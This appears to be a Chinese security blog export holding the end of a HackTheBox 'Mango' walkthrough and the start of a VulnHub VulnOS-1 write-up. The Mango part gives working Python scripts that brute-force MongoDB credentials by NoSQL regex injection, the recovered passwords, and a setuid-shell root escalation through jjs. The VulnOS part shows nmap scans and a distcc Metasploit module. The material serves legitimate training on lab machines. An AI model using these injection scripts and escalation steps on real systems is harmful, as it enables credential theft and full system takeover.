<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; username: &#123; <span class="variable">$regex</span> : <span class="string">&quot;a.*&quot;</span>, password: &#123; <span class="variable">$ne</span> : <span class="string">&quot;admin&quot;</span> &#125; &#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb21.jpg"></li>
</ul>
<p>用b.*替换a.*返回200响应，这意味着没有包含b的用户名。编写一个使用此逻辑发现用户名的脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">def sendPayload():</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> lowercase:</span><br><span class="line">        regex = <span class="string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Found valid letter: &#123;&#125;&quot;</span>.format(char)</span><br><span class="line">def getUser():</span><br><span class="line">    sendPayload()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>代码已经缩进好了，直接复制粘贴就可以使用</p>
<p>运行代码，列出DB中所有用户名中出现的所有字符。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Found valid letter: a</span><br><span class="line">Found valid letter: d</span><br><span class="line">Found valid letter: g</span><br><span class="line">Found valid letter: i</span><br><span class="line">Found valid letter: m</span><br><span class="line">Found valid letter: n</span><br><span class="line">Found valid letter: o</span><br></pre></td></tr></table></figure>

<p>脚本发现了7个有效字符，即a、d、g、i、m、n、o。现在已经减少了字符集，可以尝试显示实际的用户名。regex中的插入符号^用于标记单词的开头。例如，模式^a.*仅当用户名以a开头时才返回true。<br>类似地，模式^ad.*如果以ad开头的用户名存在，则返回true，以此类推。使用这个逻辑更新脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">valid = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">def sendPayload(word):</span><br><span class="line">    regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word)</span><br><span class="line">    data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">    response = post(url, data = data, allow_redirects=False)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">        <span class="built_in">return</span> word</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">if</span> sendPayload(char) != None:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Found username starting with &#123;&#125;&quot;</span>.format(char)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>
<p>脚本循环遍历字符集，查找以这些字母中的任何一个开头的用户名。<br>运行脚本后出现下面的结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Found username starting with a</span><br><span class="line">Found username starting with m</span><br></pre></td></tr></table></figure>

<p>发现DB分别包含以a和m开头的用户名。更新脚本以显示真正的用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import lowercase</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">valid = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">def sendPayload(word):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">return</span> char</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>]:</span><br><span class="line">        username = ch</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            char = sendPayload(username)</span><br><span class="line">            <span class="keyword">if</span> char != None:</span><br><span class="line">                username += char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Username found: &#123;&#125;&quot;</span>.format(username)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>脚本循环遍历有效字符并查找以a和m开头的用户名。</p>
<p>包含302状态码(URL重定向)的HTTP响应包含一个有效字符，该脚本输出结果如下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username found: admin</span><br><span class="line">Username found: mango</span><br></pre></td></tr></table></figure>

<p>标识了两个有效的用户名，admin和mango。可以尝试使用相同的逻辑来识别他们的密码。</p>
<p>修改脚本如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import printable</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">def sendPayload(user):</span><br><span class="line">    valid = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> printable:</span><br><span class="line">        regex = <span class="string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username&#x27;</span> : user, <span class="string">&#x27;password[$regex]&#x27;</span> : regex, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            valid.append(char)</span><br><span class="line">    <span class="built_in">return</span> valid</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>]:</span><br><span class="line">        valid = sendPayload(user)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Valid characters for &#123;&#125;: &#123;&#125;&quot;</span>.format(user, valid)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>该脚本遍历所有可打印的ASCII字符。分别为两个用户返回有效的字符集，从而减少了下一阶段的请求数量。</p>
<p>运行结果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Valid characters <span class="keyword">for</span> admin: [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;|&#x27;</span>]</span><br><span class="line">Valid characters <span class="keyword">for</span> mango: [<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码"><a href="#以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码" class="headerlink" title="以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码"></a>以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码</h3><p>现在已经有了两个密码的字符集，更新脚本来查找密码。字符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^，$，|，\\和.</span><br></pre></td></tr></table></figure>
<p>应该用反斜杠进行转义，因为它们在正则表达式中具有特殊意义，并且可能导致错误的否定。</p>
<p>依照之前爆破用户名脚本的方法修改脚本如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import printable</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">admin_pass = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\$&#x27;</span>, <span class="string">&#x27;\\.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\^&#x27;</span>, <span class="string">&#x27;\\|&#x27;</span>]</span><br><span class="line">mango_pass = [<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;\\$&#x27;</span>, <span class="string">&#x27;\\.&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\\^&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\\|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">def sendPayload(user, word):</span><br><span class="line">    valid = admin_pass <span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">else</span> mango_pass</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username&#x27;</span> : user, <span class="string">&#x27;password[$regex]&#x27;</span> : regex, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">return</span> char</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>]:</span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            char = sendPayload(user, password)</span><br><span class="line">            <span class="keyword">if</span> char != None:</span><br><span class="line">                password += char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Password for &#123;&#125; found: &#123;&#125;&quot;</span>.format(user, password)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>

<p>该脚本对两个用户都使用有效的字符集，并逐个字符地显示他们的密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Password <span class="keyword">for</span> admin found: t9KcS3&gt;!0B<span class="comment">#2</span></span><br><span class="line">Password <span class="keyword">for</span> mango found: h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure>

<p>两个用户的密码都被成功地获取了。用户mango的凭证可以用来通过SSH登录。</p>
<h3 id="getshell-amp-提权"><a href="#getshell-amp-提权" class="headerlink" title="getshell &amp; 提权"></a>getshell &amp; 提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Connecting to 10.10.10.162:22...</span><br><span class="line">Connection established.</span><br><span class="line">To escape to <span class="built_in">local</span> shell, press <span class="string">&#x27;Ctrl+Alt+]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Tue Apr 21 05:18:56 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.08               Processes:            99</span><br><span class="line">  Usage of /:   25.8% of 19.56GB   Users logged <span class="keyword">in</span>:      0</span><br><span class="line">  Memory usage: 14%                IP address <span class="keyword">for</span> ens33: 10.10.10.162</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">122 packages can be updated.</span><br><span class="line">18 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138</span><br><span class="line">/usr/bin/xauth:  file /home/mango/.Xauthority does not exist</span><br><span class="line">mango@mango:~$ id</span><br><span class="line">uid=1000(mango) gid=1000(mango) groups=1000(mango)</span><br><span class="line">mango@mango:~$ whoami</span><br><span class="line">mango</span><br><span class="line">mango@mango:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> mango: </span><br><span class="line">Sorry, user mango may not run sudo on mango.</span><br></pre></td></tr></table></figure>

<p>找到user.txt但是用户权限不足</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mango@mango:/home$ <span class="built_in">cd</span> admin</span><br><span class="line">mango@mango:/home/admin$ ls</span><br><span class="line">user.txt</span><br><span class="line">mango@mango:/home/admin$ cat user.txt</span><br><span class="line">cat: user.txt: Permission denied</span><br></pre></td></tr></table></figure>

<p>切换用户，获取user</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mango@mango:/home/admin$ su admin</span><br><span class="line">Password: </span><br><span class="line">$ id</span><br><span class="line">uid=4000000000(admin) gid=1001(admin) groups=1001(admin)</span><br><span class="line">$ whoami</span><br><span class="line">admin</span><br><span class="line">$ ls</span><br><span class="line">user.txt</span><br><span class="line">$ cat user.txt</span><br><span class="line">79bf31c6c6eb38a8567832f7f8b47e92</span><br></pre></td></tr></table></figure>

<p>下面就是提权步骤了</p>
<p>搜索SUID文件会发现两个不常见的二进制文件，run-mailcap和jjs。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/snap/core/7713/bin/mount</span><br><span class="line">/snap/core/7713/bin/ping</span><br><span class="line">/snap/core/7713/bin/ping6</span><br><span class="line">/snap/core/7713/bin/su</span><br><span class="line">/snap/core/7713/bin/umount</span><br><span class="line">/snap/core/7713/usr/bin/chfn</span><br><span class="line">/snap/core/7713/usr/bin/chsh</span><br><span class="line">/snap/core/7713/usr/bin/gpasswd</span><br><span class="line">/snap/core/7713/usr/bin/newgrp</span><br><span class="line">/snap/core/7713/usr/bin/passwd</span><br><span class="line">/snap/core/7713/usr/bin/sudo</span><br><span class="line">/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/7713/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/7713/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/7713/usr/sbin/pppd</span><br><span class="line">/snap/core/6350/bin/mount</span><br><span class="line">/snap/core/6350/bin/ping</span><br><span class="line">/snap/core/6350/bin/ping6</span><br><span class="line">/snap/core/6350/bin/su</span><br><span class="line">/snap/core/6350/bin/umount</span><br><span class="line">/snap/core/6350/usr/bin/chfn</span><br><span class="line">/snap/core/6350/usr/bin/chsh</span><br><span class="line">/snap/core/6350/usr/bin/gpasswd</span><br><span class="line">/snap/core/6350/usr/bin/newgrp</span><br><span class="line">/snap/core/6350/usr/bin/passwd</span><br><span class="line">/snap/core/6350/usr/bin/sudo</span><br><span class="line">/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/6350/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/6350/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/6350/usr/sbin/pppd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/run-mailcap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>

<p>参考GTFOBins</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcnVuLW1haWxjYXAv">run-mailcap<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvampzLw==">jjs<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>使用Java的Runtime.Exec()函数生成一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; Java.type(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">&#x27;cp /bin/sh /tmp/sh&#x27;</span>).waitFor()</span><br><span class="line">0</span><br><span class="line">jjs&gt; Java.type(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">&#x27;chmod u+s /tmp/sh&#x27;</span>).waitFor()</span><br><span class="line">0</span><br><span class="line">jjs&gt; </span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ ls</span><br><span class="line">hsperfdata_root     systemd-private-daa6581d1d8b4f4ca498d538b165beb7-apache2.service-TSRSE0</span><br><span class="line">mongodb-27017.sock  systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-resolved.service-VipHFk</span><br><span class="line">sh            systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-timesyncd.service-1Ap17W</span><br><span class="line">$ ./sh -p</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">8a8ef79a7a2fbb01ea81688424e9ab15</span><br></pre></td></tr></table></figure>

<p>成功的获取了root权限并取得了flag</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb22.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb23.jpg"></p>
</li>
</ul>
<p><font color="red">知识点总结：</font></p>
<ul>
<li>向php请求参数添加[],使用弱比较绕过身份验证</li>
<li>NoSQL注入攻击，$ne注入</li>
<li>MongoDB注入</li>
<li>正则匹配fuzz查询用户名以及密码</li>
<li>编写python fuzz脚本根据302，200返回页面判断参数是否存在</li>
<li>GTFOBins jjs 使用Java的Runtime.Exec()函数生成一个shell</li>
<li>chmod u+s /tmp/sh更改shell权限，并使用-p参数提升为root权限</li>
</ul>
<p><font color="red">Game over</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[vulnos-1]</title>
    <url>/2020/04/16/vulnos-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：VulnOS: 1<br>发布日期：2014年3月22日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>VulnOS.vdi-vbox.7z</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TLnZkaS12Ym94Ljd6">https://download.vulnhub.com/vulnos/VulnOS.vdi-vbox.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92dWxub3MvVnVsbk9TLnZkaS12Ym94Ljd6LnRvcnJlbnQ=">https://download.vulnhub.com/vulnos/VulnOS.vdi-vbox.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>欢迎使用VulnOS！</p>
<p>这是制定的第一个脆弱目标，因为想回馈社区。为使事情成为可能的社区而努力！！！</p>
<p>目标是root它并找到操作系统内部的所有漏洞！这是一个ubuntu服务器10.04 LTS（已经制成了很多bug！！！）请勿在生产环境中使用此Box！这是一台VM，它是使用Virtualbox 4.3.8制作的-因此采用.vdi格式。</p>
<p>联网 ：<br>此box是使用桥接网络制成的，并使用DHCP获取IP地址（在构建时为192.168.1.66）。因此，最好将攻击操作系统和TARGET BOX共享到192.168.1.1/24的IP范围也许您可以使用m0n0wall进行设置并设置静态IP地址。<br>如果找不到目标的IP地址，请联系blakrat1 AT gmail DOT com。将为您提供root用户和密码以进行登录…。</p>
<p>希望你觉得这个box有用 ！！！</p>
<p>VulnHub独家！</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -sn -v 192.168.56.*</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.124</span><br><span class="line">Host is up (0.00s latency).</span><br><span class="line">MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p- -v -sV 192.168.56.124</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">23/tcp    open  telnet      Linux telnetd</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">53/tcp    open  domain      ISC BIND 9.7.0-P1</span><br><span class="line">80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">110/tcp   open  pop3        Dovecot pop3d</span><br><span class="line">111/tcp   open  rpcbind     2 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp   open  imap        Dovecot imapd</span><br><span class="line">389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>        netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  shell       Netkit rshd</span><br><span class="line">901/tcp   open  http        Samba SWAT administration server</span><br><span class="line">993/tcp   open  ssl/imap    Dovecot imapd</span><br><span class="line">995/tcp   open  ssl/pop3    Dovecot pop3d</span><br><span class="line">2000/tcp  open  sieve       Dovecot timsieved</span><br><span class="line">2049/tcp  open  nfs         2-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1</span><br><span class="line">3632/tcp  open  tcpwrapped</span><br><span class="line">6667/tcp  open  irc         IRCnet ircd</span><br><span class="line">8070/tcp  open  ucs-isc?</span><br><span class="line">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">10000/tcp open  http        MiniServ 0.01 (Webmin httpd)</span><br><span class="line">33370/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">56041/tcp open  status      1 (RPC <span class="comment">#100024)</span></span><br><span class="line">56144/tcp open  nlockmgr    1-4 (RPC <span class="comment">#100021)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -T4 -p 3632 -v 192.168.56.124</span></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3632/tcp open  distccd</span><br></pre></td></tr></table></figure>

<p>在服务上花了足够的时间并尝试利用它们之后，成功利用了端口3632上托管的“distccd”服务。</p>
<p>搜索该服务的漏洞利用程序，发现了Meatsploit漏洞利用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search distccd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                           ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution</span><br></pre></td></tr></table></figure>

<p>设置RHOST IP地址并启动漏洞利用程序。</p>
